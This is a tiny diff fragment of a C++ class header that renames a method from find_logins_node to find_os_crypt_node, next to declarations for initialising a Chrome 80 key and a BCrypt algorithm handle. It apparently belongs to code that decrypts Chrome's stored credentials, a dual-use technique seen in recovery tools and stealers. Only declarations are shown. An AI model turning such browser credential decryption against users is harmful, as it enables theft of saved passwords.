@@ -29,7 +29,7 @@ private:
     bool init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey);
 
 
-    cJSON* find_logins_node(cJSON* input_node, const char* pattern);
+    cJSON* find_os_crypt_node(cJSON* input_node, const char* pattern);
 
 	
     BCRYPT_ALG_HANDLE m_hAlg;
